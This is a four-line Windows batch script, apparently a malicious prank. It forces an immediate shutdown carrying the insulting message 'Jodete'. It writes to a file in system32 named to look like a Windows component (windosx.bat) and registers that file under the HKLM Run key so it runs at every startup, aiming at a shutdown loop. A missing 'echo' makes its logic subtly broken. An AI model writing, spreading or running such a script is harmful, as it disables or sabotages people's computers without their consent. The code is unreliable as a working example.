@echo off
shutdown -s -f -t 2 -c "Jodete" >> c:/windows/system32/windosx.bat
REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v sysin2 /t REG_SZ /d "c:/windows/system32/windosx.bat"
exit